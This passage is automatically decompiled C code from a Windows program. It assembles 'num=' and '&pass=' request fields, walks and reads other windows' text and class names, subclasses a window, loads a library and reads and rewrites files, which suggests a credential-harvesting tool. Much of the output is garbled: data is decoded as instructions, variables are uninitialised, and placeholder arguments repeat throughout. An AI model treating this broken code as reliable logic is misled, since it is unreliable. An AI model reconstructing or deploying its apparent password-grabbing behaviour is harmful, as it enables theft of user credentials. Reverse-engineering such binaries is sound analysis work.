    *(int32_t *)(v15 - 12) = 0;
    *(int32_t *)(v15 - 20) = v13;
    *(int32_t *)(v15 - 24) = 0x4065ee;
    int32_t v16 = __readfsdword(0); // 0x406363
    int32_t v17 = v15 - 28; // 0x406363
    *(int32_t *)v17 = v16;
    __writefsdword(0, v17);
    function_40380e();
    int32_t v18; // bp-4, 0x406339
    *(int32_t *)(v15 - 32) = (int32_t)&v18;
    function_40372a(&g118);
    int32_t v19 = v15 - 36; // 0x406394
    int32_t * v20 = (int32_t *)v19;
    int32_t v21; // bp-8, 0x406339
    *v20 = (int32_t)&v21;
    function_4034ca();
    function_40372a(&g118);
    v3 = a1 - 1;
    int32_t * v22 = v20; // 0x406339
    int32_t v23 = v19; // 0x406339
    switch (a1) {
        case 0: {
            // 0x4063cb
            v22 = v20;
            v23 = v19;
            if (function_4034ca() >= 5) {
                // 0x4063dc
                function_403476();
                function_4060f2();
                function_403476();
                function_4060f2();
                *(int32_t *)(v15 - 48) = v18;
                *(int32_t *)(v15 - 52) = (int32_t)&g5;
                *(int32_t *)(v15 - 56) = v21;
                function_40358a((int32_t)&g118);
                *(int32_t *)(v15 - 64) = 0x40661e;
                *(int32_t *)(v15 - 68) = v18;
                *(int32_t *)(v15 - 72) = 0x40662e;
                *(int32_t *)(v15 - 76) = v21;
                *(int32_t *)(v15 - 80) = 0x40663e;
                function_407496();
                function_40358a((int32_t)&g118);
                int32_t v24 = v15 - 92; // 0x40646a
                int32_t * v25 = (int32_t *)v24;
                int32_t v26; // bp-40, 0x406339
                *v25 = (int32_t)&v26;
                function_403476();
                function_4060f2();
                int32_t v27 = function_40380e(); // 0x40648e
                int32_t * v28 = (int32_t *)(v15 - 96); // 0x406494
                *v28 = v27 - 1;
                function_403476();
                function_4060f2();
                function_40372a(&g118);
                *v28 = v26;
                function_403476();
                function_4060f2();
                function_403476();
                function_4060f2();
                function_4057d2((int32_t)&g118, (int32_t)&g118, (int32_t)&g118, (int32_t)&g118);
                v22 = v25;
                v23 = v24;
            }
            // break -> 0x4065d3
            break;
        }
        case 1: {
            // 0x40650b
            v22 = v20;
            v23 = v19;
            if (function_4034ca() >= 5) {
                // 0x40651c
                *(int32_t *)(v15 - 40) = (int32_t)"num=";
                function_404b22();
                *(int32_t *)(v15 - 48) = (int32_t)"&pass=";
                function_404b22();
                int32_t v29 = v15 - 52; // 0x40653f
                function_40358a((int32_t)&g118);
                function_403476();
                function_4060f2();
                function_404c7a();
                v22 = (int32_t *)v29;
                v23 = v29;
            }
            // break -> 0x4065d3
            break;
        }
        case 2: {
            // 0x406579
            v22 = v20;
            v23 = v19;
            if (function_4034ca() >= 5) {
                // 0x406586
                *(int32_t *)(v15 - 40) = (int32_t)"num=";
                function_404b22();
                *(int32_t *)(v15 - 48) = (int32_t)"&pass=";
                function_404b22();
                int32_t v30 = v15 - 52; // 0x4065a9
                function_40358a((int32_t)&g118);
                function_4060f2();
                function_404c7a();
                v22 = (int32_t *)v30;
                v23 = v30;
            }
            // break -> 0x4065d3
            break;
        }
    }
    // 0x4065d3
    __writefsdword(0, *v22);
    *(int32_t *)(v23 + 8) = 0x4065f5;
    return function_403396();
}

// Address range: 0x4065ee - 0x4065f3
int32_t function_4065ee(void) {
    // 0x4065ee
    return function_402d86((int32_t)&g118, (int32_t)&g118);
}

// Address range: 0x4065f3 - 0x4065f5
int32_t function_4065f3(void) {
    // 0x4065f3
    int32_t result; // 0x4065f3
    return result;
}

// Address range: 0x4065f5 - 0x4065fc
int32_t function_4065f5(int32_t a1) {
    // 0x4065f5
    int32_t result; // 0x4065f5
    return result;
}

// Address range: 0x406621 - 0x406624
int32_t function_406621(void) {
    // 0x406621
    int32_t result; // 0x406621
    return result;
}

// Address range: 0x406629 - 0x406630
int32_t function_406629(void) {
    // 0x406629
    int32_t v1; // 0x406629
    *(int32_t *)v1 = v1 + 1;
    int32_t result; // 0x406629
    int32_t v2 = result;
    *(char *)v2 = *(char *)&result + (char)v2;
    uint32_t v3 = result;
    *(char *)v3 = *(char *)&result + (char)(v3 / 256);
    return result;
}

// Address range: 0x406630 - 0x406634
int32_t function_406630(void) {
    // 0x406630
    return function_40666e();
}

// Address range: 0x40666c - 0x40666e
int32_t function_40666c(void) {
    // 0x40666c
    int32_t result; // 0x40666c
    *(char *)result = 2 * (char)result;
    return result;
}

// Address range: 0x40666e - 0x40671b
int32_t function_40666e(void) {
    // 0x40666e
    bool v1; // 0x40666e
    if (v1) {
        // 0x4066d2
        function_4045ae();
    } else {
        bool v2; // 0x40666e
        if (v2) {
            // 0x406673
            int32_t result; // 0x40666e
            return result;
        }
    }
    // 0x4066e6
    CreateThread(NULL, (int32_t)&g118, (int32_t (*)(int32_t *))&g118, &g118, (int32_t)&g118, &g118);
    int32_t v3; // 0x40666e
    int32_t lpThreadAttributes = v3 + 20; // 0x4066ed
    CreateThread((struct _SECURITY_ATTRIBUTES *)lpThreadAttributes, 0, NULL, (int32_t *)0x40634a, 0, NULL);
    int32_t Msg = *(int32_t *)(v3 + 16); // 0x406707
    int32_t lParam = *(int32_t *)(v3 + 8); // 0x40670c
    int32_t wParam; // 0x40666e
    return DefWindowProcA((int32_t *)*(int32_t *)lpThreadAttributes, Msg, wParam, lParam);
}

// Address range: 0x40671e - 0x406753
int32_t function_40671e(void) {
    // 0x40671e
    return SetWindowLongA((int32_t *)0x4066a2, -4, function_4045be(0, 0, 0, 0, 0, 0, 0, (int32_t)g82, 0));
}

// Address range: 0x406753 - 0x406873
int32_t function_406753(int32_t result2, uint32_t a2, int32_t a3, int32_t a4, int32_t lpClassName, int32_t a6, int32_t a7) {
    // 0x406753
    int32_t v1; // 0x406753
    unsigned char v2 = (char)v1;
    *(char *)v1 = 2 * v2;
    char * v3 = (char *)(v1 + 114); // 0x406755
    uint32_t v4; // 0x406753
    char v5 = v4 / 256; // 0x406755
    *v3 = *v3 + v5;
    unsigned char v6 = v2 - 32; // 0x406758
    int32_t result = v1 & -256 | (int32_t)v6; // 0x406758
    if (v2 >= 32 && v6 != 0) {
        // 0x4067ad
        return result;
    }
    char * v7 = (char *)(result + 105); // 0x40675c
    *v7 = *v7 & v5;
    int16_t v8 = a3; // 0x406760
    __asm_outsb(v8, *(char *)a6);
    char * v9 = (char *)(lpClassName + 105 & 0xffff); // 0x406761
    *v9 = *v9 & (char)(a2 / 256);
    char * v10 = (char *)(a2 + 115 + 2 * lpClassName); // 0x406765
    char v11 = *v10 + (char)a2; // 0x406765
    *v10 = v11;
    if (v11 == 0) {
        // 0x4067ad
        return result2;
    }
    // 0x40676b
    __asm_outsd(v8, *(int32_t *)a6);
    int32_t * v12 = FindWindowA((char *)lpClassName, (char *)&g118); // 0x406782
    if (v12 != NULL) {
        // 0x4067ad
        return (int32_t)v12;
    }
    // 0x40678f
    function_40671e();
    return (int32_t)LoadLibraryA((char *)function_4036ca());
}

// Address range: 0x406873 - 0x406ae8
int32_t function_406873(int32_t a1, uint32_t a2, int32_t a3, int32_t a4, int32_t a5, int32_t a6, int32_t a7) {
    int32_t v1 = a1;
    int32_t v2 = a4;
    int32_t v3; // 0x406873
    unsigned char v4 = (char)v3;
    *(char *)v3 = 2 * v4;
    char * v5 = (char *)(v3 + 114); // 0x406875
    uint32_t v6; // 0x406873
    char v7 = v6 / 256; // 0x406875
    *v5 = *v5 + v7;
    unsigned char v8 = v4 - 32; // 0x406878
    if (v4 < 32 || v8 == 0) {
        char * v9 = (char *)((v3 & -256 | (int32_t)v8) + 105); // 0x40687c
        *v9 = *v9 & v7;
        int32_t result = v1; // 0x40687f
        int16_t v10 = a3; // 0x406880
        __asm_outsb(v10, *(char *)a6);
        char * v11 = (char *)(a5 + 105 & 0xffff); // 0x406881
        char v12 = a2 / 256; // 0x406881
        *v11 = *v11 & v12;
        char * v13 = (char *)(a2 + 115 + 2 * a5); // 0x406885
        char v14 = *v13 + (char)a2; // 0x406885
        *v13 = v14;
        if (v14 == 0) {
            // 0x4068cd
            int32_t v15; // bp+32, 0x406873
            *(int32_t *)((int32_t)&v15 - 4) = 0x4068da;
            return result;
        }
        // 0x40688b
        __asm_outsd(v10, *(int32_t *)a6);
        if (v14 < 0) {
            // 0x406902
            return result;
        }
        unsigned char v16 = (char)result; // 0x406890
        unsigned char v17 = v16 - 32; // 0x406890
        int32_t v18 = result & -256 | (int32_t)v17; // 0x406890
        if (v16 >= 32 && v17 != 0) {
            char * v19 = (char *)v18; // 0x406903
            *v19 = *v19 + v17;
            int32_t result2 = v18 + 1; // 0x406907
            char * v20 = (char *)(2 * result2); // 0x406908
            char v21 = result2; // 0x406908
            *v20 = *v20 + v21;
            char * v22 = (char *)result2; // 0x40690b
            *v22 = *v22 + v21;
            return result2;
        }
        char * v23 = (char *)(a2 + 105); // 0x406894
        *v23 = *v23 & (char)(result / 256);
        char * v24 = (char *)(a6 + 105); // 0x406897
        *v24 = *v24 & v12;
        char * v25 = (char *)v18; // 0x40689a
        *v25 = *v25 + 2 * v17;
        int32_t * v26 = (int32_t *)a2; // 0x40689e
        *v26 = *v26 + a6;
        *v25 = *v25 + v17;
        v1 = a5;
        v2 = __readfsdword(0);
        __writefsdword(0, (int32_t)&v2);
        int32_t v27 = g108 + 1; // 0x4068b3
        g108 = v27;
        if (v27 == 0) {
            // 0x4068bb
            function_403372();
        }
        // 0x4068c5
        __writefsdword(0, v2);
        // 0x4068cd
        *(int32_t *)((int32_t)&v1 - 4) = 0x4068da;
        return 0;
    }
    // 0x4068eb
    int32_t v28; // 0x406873
    int32_t v29; // 0x406873
    int32_t * v30 = (int32_t *)(v28 + 105 + 2 * v29); // 0x4068eb
    int32_t v31; // 0x406873
    *v30 = *v30 | v31;
    function_403516();
    char * lpFileName = (char *)function_4036ca(); // 0x406987
    char * v32 = lpFileName; // bp-8, 0x406987
    int32_t * fileHandle = CreateFileA(lpFileName, (int32_t)&g118, (int32_t)&g118, (struct _SECURITY_ATTRIBUTES *)&g118, (int32_t)&g118, (int32_t)&g118, &g118); // 0x406988
    int32_t v33 = (int32_t)&v32; // 0x406992
    if (fileHandle != (int32_t *)-1) {
        int32_t v34 = (int32_t)fileHandle; // 0x406988
        int32_t v35 = v34; // bp-16, 0x40699a
        int32_t v36 = GetFileSize(NULL, fileHandle); // 0x40699b
        int32_t * v37 = (int32_t *)v6; // 0x4069a0
        *v37 = v36;
        v33 = &v35;
        if (v6 >= 1) {
            // 0x4069b4
            function_403856();
            int32_t hFile = function_403722(); // 0x4069c7
            ReadFile((int32_t *)hFile, fileHandle, (int32_t)&g118, &g118, (struct _OVERLAPPED *)&g118);
            int32_t v38 = v34; // bp-40, 0x4069d3
            int32_t v39 = &v38; // 0x4069d3
            CloseHandle(fileHandle);
            function_4046d6();
            int32_t v40; // 0x406873
            int32_t * v41 = (int32_t *)(v40 - 12); // 0x406abc
            int32_t v42 = v39; // 0x406ac0
            if (*v41 != 0) {
                int32_t v43 = v40 - 20;
                int32_t v44 = v40 - 24;
                *v37 = function_40380e();
                *(int32_t *)(v39 - 4) = v40 - 16;
                function_40372a(&g118);
                function_40376a();
                *v37 = function_40380e();
                *(int32_t *)(v39 - 8) = v43;
                function_40372a(&g118);
                int32_t v45 = v39 - 12; // 0x406a51
                *(int32_t *)v45 = v44;
                function_4034ca();
                function_40372a(&g118);
                if (*(int32_t *)v43 != 0) {
                    // 0x406a6f
                    if (*(int32_t *)v44 != 0) {
                        // 0x406a75
                        *(int32_t *)(v39 - 16) = function_403c8a() + 1;
                        function_403e46();
                        function_403c92();
                        function_4033c6();
                        function_403c92();
                        function_4033c6();
                    }
                }
                // 0x406abc
                v42 = v45;
                while (*v41 != 0) {
                    int32_t v46 = v45;
                    *v37 = function_40380e();
                    *(int32_t *)(v46 - 4) = v40 - 16;
                    function_40372a(&g118);
                    function_40376a();
                    *v37 = function_40380e();
                    *(int32_t *)(v46 - 8) = v43;
                    function_40372a(&g118);
                    v45 = v46 - 12;
                    *(int32_t *)v45 = v44;
                    function_4034ca();
                    function_40372a(&g118);
                    if (*(int32_t *)v43 != 0) {
                        // 0x406a6f
                        if (*(int32_t *)v44 != 0) {
                            // 0x406a75
                            *(int32_t *)(v46 - 16) = function_403c8a() + 1;
                            function_403e46();
                            function_403c92();
                            function_4033c6();
                            function_403c92();
                            function_4033c6();
                        }
                    }
                    // 0x406abc
                    v42 = v45;
                }
            }
            // 0x406ac6
            *(int32_t *)(v40 - 4) = -1;
            v33 = v42;
        }
    }
    // 0x406acd
    __writefsdword(0, *(int32_t *)v33);
    *(int32_t *)(v33 + 8) = 0x406aef;
    return function_403396();
}

// Address range: 0x406ae8 - 0x406aed
int32_t function_406ae8(void) {
    // 0x406ae8
    return function_402d86((int32_t)&g118, (int32_t)&g118);
}

// Address range: 0x406aed - 0x406aef
int32_t function_406aed(void) {
    // 0x406aed
    int32_t result; // 0x406aed
    return result;
}

// Address range: 0x406aef - 0x406af9
int32_t function_406aef(int32_t a1, int32_t a2, int32_t a3) {
    // 0x406aef
    int32_t v1; // 0x406aef
    return *(int32_t *)(v1 - 4);
}

// Address range: 0x406b26 - 0x406c2a
int32_t function_406b26(void) {
    int32_t v1 = 0; // bp-8, 0x406b29
    int32_t v2 = __readfsdword(0); // bp-40, 0x406b3a
    int32_t v3 = &v2; // 0x406b3a
    __writefsdword(0, v3);
    int32_t v4 = v3; // 0x406b4e
    if (function_403c8a() >= 1) {
        // 0x406b54
        function_403516();
        char * lpFileName = (char *)function_4036ca(); // 0x406b83
        char * v5 = lpFileName; // bp-68, 0x406b83
        int32_t v6 = (int32_t)&v5; // 0x406b83
        int32_t * fileHandle = CreateFileA(lpFileName, (int32_t)&g118, (int32_t)&g118, (struct _SECURITY_ATTRIBUTES *)&g118, (int32_t)&g118, (int32_t)&g118, &g118); // 0x406b84
        v4 = v6;
        if (fileHandle != (int32_t *)-1) {
            // 0x406b90
            function_403372();
            uint32_t v7 = function_403c92(); // 0x406b9d
            int32_t v8 = v6; // 0x406ba6
            if (v7 >= 0) {
                int32_t v9 = 0; // 0x406ba9
                int32_t v10 = v6; // 0x406ba9
                int32_t v11 = v7 + 1; // 0x406ba9
                *(int32_t *)(v10 - 4) = 0;
                int32_t v12 = 8 * v9; // 0x406bb3
                *(int32_t *)(v10 - 8) = *(int32_t *)(g110 + v12);
                *(int32_t *)(v10 - 12) = (int32_t)&g6;
                *(int32_t *)(v10 - 16) = *(int32_t *)(g110 + (v12 | 4));
                v10 -= 20;
                *(int32_t *)v10 = (int32_t)"\r\n";
                function_40358a((int32_t)&g118);
                v11--;
                v9++;
                v8 = v10;
                while (v11 != 0) {
                    // 0x406bab
                    *(int32_t *)(v10 - 4) = 0;
                    v12 = 8 * v9;
                    *(int32_t *)(v10 - 8) = *(int32_t *)(g110 + v12);
                    *(int32_t *)(v10 - 12) = (int32_t)&g6;
                    *(int32_t *)(v10 - 16) = *(int32_t *)(g110 + (v12 | 4));
                    v10 -= 20;
                    *(int32_t *)v10 = (int32_t)"\r\n";
                    function_40358a((int32_t)&g118);
                    v11--;
                    v9++;
                    v8 = v10;
                }
            }
            int32_t v13 = (int32_t)fileHandle; // 0x406b84
            function_4046d6();
            *(int32_t *)(v8 - 4) = 0;
            *(int32_t *)(v8 - 8) = (int32_t)&v1;
            *(int32_t *)(v8 - 12) = function_4034ca();
            *(int32_t *)(v8 - 16) = function_403722();
            *(int32_t *)(v8 - 20) = v13;
            function_40446e();
            *(int32_t *)(v8 - 24) = v13;
            SetEndOfFile(&g118);
            int32_t v14 = v8 - 28; // 0x406c06
            *(int32_t *)v14 = v13;
            CloseHandle(&g118);
            v4 = v14;
        }
    }
    // 0x406c0f
    __writefsdword(0, *(int32_t *)v4);
    *(int32_t *)(v4 + 8) = 0x406c31;
    return function_403396();
}

// Address range: 0x406c2a - 0x406c2f
int32_t function_406c2a(void) {
    // 0x406c2a
    return function_402d86((int32_t)&g118, (int32_t)&g118);
}

// Address range: 0x406c2f - 0x406c31
int32_t function_406c2f(void) {
    // 0x406c2f
    int32_t result; // 0x406c2f
    return result;
}

// Address range: 0x406c31 - 0x406c3a
int32_t function_406c31(int32_t a1, int32_t a2, int32_t a3) {
    // 0x406c31
    int32_t result; // 0x406c31
    return result;
}

// Address range: 0x406c66 - 0x406d55
int32_t function_406c66(void) {
    // 0x406c66
    function_4036ba();
    function_4036ba();
    int32_t v1 = __readfsdword(0); // bp-40, 0x406c92
    __writefsdword(0, (int32_t)&v1);
    if (function_403c92() < 0) {
        // 0x406cee
        function_403c8a();
        function_403e46();
        function_403c92();
        function_4033c6();
        function_403c92();
        function_4033c6();
        function_406b26();
    } else {
        // 0x406cbc
        function_403616();
        function_403616();
    }
    // 0x406d3a
    __writefsdword(0, v1);
    return function_403396();
}

// Address range: 0x406d55 - 0x406d5a
int32_t function_406d55(void) {
    // 0x406d55
    return function_402d86((int32_t)&g118, (int32_t)&g118);
}

// Address range: 0x406d5a - 0x406d5c
int32_t function_406d5a(void) {
    // 0x406d5a
    int32_t result; // 0x406d5a
    return result;
}

// Address range: 0x406d5c - 0x406d66
int32_t function_406d5c(int32_t a1, int32_t a2, int32_t a3) {
    // 0x406d5c
    int32_t v1; // 0x406d5c
    return *(int32_t *)(v1 - 12);
}

// Address range: 0x406d66 - 0x406dac
int32_t function_406d66(void) {
    int32_t v1 = __readfsdword(0); // bp-16, 0x406d71
    __writefsdword(0, (int32_t)&v1);
    int32_t v2 = g109 + 1; // 0x406d77
    g109 = v2;
    if (v2 != 0) {
        // 0x406d9e
        __writefsdword(0, v1);
        return 0;
    }
    // 0x406d7f
    if (g33 != 0) {
        // 0x406d89
        function_406b26();
    }
    // 0x406d8e
    function_403e52();
    // 0x406d9e
    __writefsdword(0, v1);
    return 0;
}

// Address range: 0x406dac - 0x406db1
int32_t function_406dac(void) {
    // 0x406dac
    return function_402d86((int32_t)&g118, (int32_t)&g118);
}

// Address range: 0x406db1 - 0x406db3
int32_t function_406db1(void) {
    // 0x406db1
    int32_t result; // 0x406db1
    return result;
}

// Address range: 0x406db3 - 0x406db5
int32_t function_406db3(int32_t a1) {
    // 0x406db3
    int32_t result; // 0x406db3
    return result;
}

// Address range: 0x406db6 - 0x406df8
int32_t function_406db6(void) {
    int32_t v1 = __readfsdword(0); // bp-16, 0x406dc1
    __writefsdword(0, (int32_t)&v1);
    int32_t v2 = g109; // 0x406dc7
    g109 = v2 - 1;
    if (v2 == 0) {
        // 0x406dd0
        function_403e46();
    }
    // 0x406dea
    __writefsdword(0, v1);
    return 0;
}

// Address range: 0x406df8 - 0x406dfd
int32_t function_406df8(void) {
    // 0x406df8
    return function_402d86((int32_t)&g118, (int32_t)&g118);
}

// Address range: 0x406dfd - 0x406dff
int32_t function_406dfd(void) {
    // 0x406dfd
    int32_t result; // 0x406dfd
    return result;
}

// Address range: 0x406dff - 0x406e01
int32_t function_406dff(int32_t a1) {
    // 0x406dff
    int32_t result; // 0x406dff
    return result;
}

// Address range: 0x406e02 - 0x406e08
bool function_406e02(char * pszPath) {
    // 0x406e02
    return PathFileExistsA(pszPath);
}

// Address range: 0x406e0a - 0x406e48
int32_t function_406e0a(void) {
    int32_t v1 = 260; // bp-276, 0x406e14
    int32_t nBufferLength; // 0x406e0a
    int32_t pathSize = GetTempPathA(nBufferLength, (char *)&g118); // 0x406e19
    if (pathSize == 0) {
        // 0x406e40
        return 0;
    }
    int32_t v2 = &v1; // 0x406e14
    int32_t v3 = pathSize + v2;
    if (*(char *)(v3 - 1) != 92) {
        // 0x406e29
        *(char *)v3 = 92;
        *(char *)(pathSize + (v2 | 1)) = 0;
    }
    // 0x406e40
    return function_4034b2();
}

// Address range: 0x406e4a - 0x406f1c
int32_t function_406e4a(int32_t a1, int32_t nIndex) {
    int32_t hWnd2 = 0; // bp-8, 0x406e4d
    int32_t v1 = __readfsdword(0); // bp-40, 0x406e64
    __writefsdword(0, (int32_t)&v1);
    int32_t v2 = nIndex; // bp-44, 0x406e6d
    int32_t * hWnd = (int32_t *)nIndex; // 0x406e6e
    bool isVisible = IsWindowVisible(hWnd); // 0x406e6e
    int32_t v3 = &v2; // 0x406e7b
    if (isVisible) {
        int32_t v4 = nIndex; // bp-52, 0x406e83
        int32_t v5 = GetClassLongA((int32_t *)-32, nIndex); // 0x406e84
        v3 = &v4;
        if (v5 == 0x8002) {
            int32_t v6 = nIndex; // bp-56, 0x406e90
            int32_t * v7 = GetParent(hWnd); // 0x406e91
            v3 = &v6;
            if (*(int32_t *)(a1 + 4) == (int32_t)v7) {
                int32_t v8 = nIndex; // bp-64, 0x406e9f
                int32_t v9 = &v8; // 0x406e9f
                GetWindowThreadProcessId(&hWnd2, hWnd);
                v3 = v9;
                if (*(int32_t *)a1 == hWnd2) {
                    // 0x406eac
                    if (*(int32_t *)(a1 + 8) == 0) {
                        int32_t hWndParent = *(int32_t *)(a1 + 12); // 0x406ed6
                        int32_t hWndChildAfter = *(int32_t *)(a1 + 16); // 0x406eda
                        int32_t * hWnd3 = FindWindowExA((int32_t *)hWndParent, (int32_t *)hWndChildAfter, NULL, (char *)nIndex); // 0x406ee1
                        int32_t v10 = (int32_t)hWnd3; // 0x406ee1
                        *(int32_t *)(a1 + 24) = v10;
                        int32_t v11 = v10; // bp-84, 0x406eec
                        int32_t v12 = &v11; // 0x406eec
                        v3 = v12;
                        if (IsWindow(hWnd3)) {
                            // 0x406efc
                            *(int32_t *)(a1 + 20) = nIndex;
                            v3 = v12;
                        }
                    } else {
                        // 0x406eb2
                        function_407022();
                        function_403476();
                        function_403616();
                        v3 = v9;
                    }
                }
            }
        }
    }
    // 0x406f01
    __writefsdword(0, *(int32_t *)v3);
    *(int32_t *)(v3 + 8) = 0x406f23;
    return function_403396();
}

// Address range: 0x406f1c - 0x406f21
int32_t function_406f1c(void) {
    // 0x406f1c
    return function_402d86((int32_t)&g118, (int32_t)&g118);
}

// Address range: 0x406f21 - 0x406f23
int32_t function_406f21(void) {
    // 0x406f21
    int32_t result; // 0x406f21
    return result;
}

// Address range: 0x406f23 - 0x406f2e
int32_t function_406f23(int32_t a1, int32_t a2, int32_t a3) {
    // 0x406f23
    int32_t result; // 0x406f23
    return result;
}

// Address range: 0x406f2e - 0x406fb3
int32_t function_406f2e(int32_t a1, uint32_t a2, int32_t a3) {
    // 0x406f2e
    int32_t hWnd; // 0x406f2e
    int32_t lpdwProcessId; // 0x406f2e
    GetWindowThreadProcessId((int32_t *)hWnd, (int32_t *)lpdwProcessId);
    int32_t v1 = function_40441e(); // 0x406f6b
    int32_t v2; // bp-60, 0x406f2e
    int32_t v3 = &v2; // 0x406f70
    int32_t v4; // bp-40, 0x406f2e
    *(int32_t *)(v3 - 4) = (int32_t)&v4;
    *(int32_t *)(v3 - 8) = 0x406e4a;
    EnumWindows((bool (*)(int32_t *, int32_t))&g118, (int32_t)&g118);
    *(int32_t *)(v3 - 12) = 1;
    Sleep((int32_t)&g118);
    v3 -= 16;
    *(int32_t *)v3 = 0;
    while (!IsWindow(&g118)) {
        // 0x406f91
        if (function_40441e() - v1 > a2) {
            // break -> 0x406f9c
            break;
        }
        *(int32_t *)(v3 - 4) = (int32_t)&v4;
        *(int32_t *)(v3 - 8) = 0x406e4a;
        EnumWindows((bool (*)(int32_t *, int32_t))&g118, (int32_t)&g118);
        *(int32_t *)(v3 - 12) = 1;
        Sleep((int32_t)&g118);
        v3 -= 16;
        *(int32_t *)v3 = 0;
    }
    // 0x406f9c
    return 0;
}

// Address range: 0x406fb6 - 0x406fcd
int32_t function_406fb6(void) {
    // 0x406fb6
    int32_t v1; // 0x406fb6
    return (unsigned char)((char)v1 - 33) < 94;
}

// Address range: 0x406fce - 0x406fe5
int32_t function_406fce(int32_t a1) {
    int32_t v1 = -1; // 0x406fd9
    int32_t v2 = 0; // 0x406fd9
    while (v1 != 0) {
        int32_t v3; // 0x406fce
        int32_t v4 = v3;
        v1--;
        bool v5; // 0x406fce
        v3 = v4 + (v5 ? -1 : 1);
        v2 = v1;
        if (*(char *)v4 == 0) {
            // break ->
            break;
        }
        v2 = 0;
    }
    return -2 - v2;
}

// Address range: 0x406fe6 - 0x406ff8
int32_t function_406fe6(void) {
    // 0x406fe6
    return function_403476();
}

// Address range: 0x406ffa - 0x407022
int32_t function_406ffa(void) {
    int32_t v1 = -1; // 0x407007
    int32_t v2 = 0; // 0x407007
    bool v3; // 0x406ffa
    while (v1 != 0) {
        int32_t v4; // 0x406ffa
        int32_t v5 = v4;
        v1--;
        v4 = v5 + (v3 ? -1 : 1);
        v2 = v1;
        if (*(char *)v5 == 0) {
            // break ->
            break;
        }
        v2 = 0;
    }
    uint32_t v6 = v2 ^ -1; // 0x407009
    uint32_t v7 = v6 / 4; // 0x407013
    int32_t v8; // 0x406ffa
    int32_t result; // 0x406ffa
    __asm_rep_movsd_memcpy((char *)result, (char *)v8, v7);
    char * v9 = (char *)(v7 * (v3 ? -4 : 4) + result); // 0x40701d
    __asm_rep_movsb_memcpy(v9, v9, v6 & 3);
    return result;
}

// Address range: 0x407022 - 0x407055
int32_t function_407022(void) {
    // 0x407022
    int32_t hWnd; // 0x407022
    int32_t v1 = SendMessageA((int32_t *)hWnd, (int32_t)&g118, (int32_t)&g118, (int32_t)&g118); // 0x407036
    int32_t v2; // bp-284, 0x407022
    *(char *)(v1 + (int32_t)&v2) = 0;
    return function_4034b2();
}

// Address range: 0x407056 - 0x40708d
int32_t function_407056(void) {
    // 0x407056
    int32_t lpClassName; // 0x407056
    int32_t hWnd; // 0x407056
    int32_t v1 = GetClassNameA((int32_t *)hWnd, (char *)lpClassName, (int32_t)&g118); // 0x40706d
    int32_t v2; // bp-284, 0x407056
    *(char *)(v1 + (int32_t)&v2) = 0;
    return function_4034b2();
}

// Address range: 0x40708e - 0x4070cd
int32_t function_40708e(void) {
    // 0x40708e
    function_4034ca();
    function_4034ca();
    return function_40372a(&g118);
}

// Address range: 0x4070ce - 0x407106
int32_t function_4070ce(void) {
    // 0x4070ce
    function_4034ca();
    int32_t v1; // 0x4070ce
    return function_40372a((int32_t *)v1);
}

// Address range: 0x407106 - 0x407135
int32_t function_407106(void) {
    // 0x407106
    function_4036ca();
    int32_t Locale = function_4036ca(); // 0x40711a
    int32_t v1 = CompareStringA(Locale, 1, (char *)1024, (int32_t)&g118, (char *)&g118, (int32_t)&g118); // 0x407127
    return v1 & -256 | (int32_t)(v1 == 2);
}

// Address range: 0x407136 - 0x4071b0
int32_t function_407136(void) {
    int32_t v1 = __readfsdword(0); // bp-32, 0x407148
    __writefsdword(0, (int32_t)&v1);
    int32_t v2; // bp-36, 0x407136
    int32_t v3 = &v2; // 0x407150
    int32_t hWnd; // 0x407136
    int32_t v4 = (int32_t)GetTopWindow((int32_t *)hWnd);
    int32_t * v5 = (int32_t *)(v3 - 4); // 0x407190
    *v5 = v4;
    bool v6 = IsWindow(&g118); // 0x407191
    int32_t v7 = v3; // 0x407198
    int32_t * v8 = v5; // 0x407198
    if (v6) {
        function_407022();
        function_407136();
        *(int32_t *)(v3 - 8) = 2;
        int32_t v9 = v3 - 12; // 0x407188
        *(int32_t *)v9 = v4;
        int32_t v10 = (int32_t)GetWindow(&g118, (int32_t)&g118);
        int32_t * v11 = (int32_t *)(v3 - 16);
        *v11 = v10;
        bool v12 = IsWindow(&g118); // 0x407191
        v7 = v9;
        v8 = v11;
        while (v12) {
            int32_t v13 = v9;
            function_407022();
            function_407136();
            *(int32_t *)(v13 - 8) = 2;
            v9 = v13 - 12;
            *(int32_t *)v9 = v10;
            v10 = (int32_t)GetWindow(&g118, (int32_t)&g118);
            v11 = (int32_t *)(v13 - 16);
            *v11 = v10;
            v12 = IsWindow(&g118);
            v7 = v9;
            v8 = v11;
        }
    }
    // 0x40719a
    __writefsdword(0, *v8);
    *(int32_t *)(v7 + 4) = 0x4071b7;
    return function_403372();
}

// Address range: 0x4071b0 - 0x4071b5
int32_t function_4071b0(void) {
    // 0x4071b0
    return function_402d86((int32_t)&g118, (int32_t)&g118);
}

// Address range: 0x4071b5 - 0x4071b7
int32_t function_4071b5(void) {
    // 0x4071b5
    int32_t result; // 0x4071b5
    return result;
}

// Address range: 0x4071b7 - 0x4071bf
int32_t function_4071b7(int32_t a1, int32_t a2, int32_t a3, int32_t a4, int32_t a5) {
    // 0x4071b7
    int32_t result; // 0x4071b7
    return result;
}

// Address range: 0x4071c2 - 0x407223
int32_t function_4071c2(void) {
    int32_t v1 = __readfsdword(0); // bp-28, 0x4071d3
    __writefsdword(0, (int32_t)&v1);
    function_407056();
    function_403616();
    function_407136();
    __writefsdword(0, v1);
    return function_403372();
}

// Address range: 0x407223 - 0x407228
int32_t function_407223(void) {
    // 0x407223
    return function_402d86((int32_t)&g118, (int32_t)&g118);
}

// Address range: 0x407228 - 0x40722a
int32_t function_407228(void) {
    // 0x407228
    int32_t result; // 0x407228
    return result;
}

// Address range: 0x40722a - 0x407231
int32_t function_40722a(int32_t a1, int32_t a2, int32_t a3, int32_t a4) {
    // 0x40722a
    int32_t result; // 0x40722a
    return result;
}

// Address range: 0x407245 - 0x40724d
int32_t function_407245(void) {
    // 0x407245
    int32_t v1; // 0x407245
    *(int32_t *)v1 = v1 + 1;
    int32_t result; // 0x407245
    int32_t v2 = result;
    *(char *)v2 = *(char *)&result + (char)v2;
    int32_t v3; // 0x407245
    char * v4 = (char *)(v3 + 81); // 0x407249
    int32_t v5; // 0x407245
    *v4 = *v4 + (char)v5;
    return result;
}

// Address range: 0x40724d - 0x407251
float80_t function_40724d(void) {
    // 0x40724d
    float80_t v1; // 0x40724d
    return 2 * v1;
}

// Address range: 0x407252 - 0x4072d1
int32_t function_407252(void) {
    int32_t v1 = __readfsdword(0); // bp-24, 0x407262
    __writefsdword(0, (int32_t)&v1);
    function_407056();
    function_403616();
    int32_t nIndex; // 0x407252
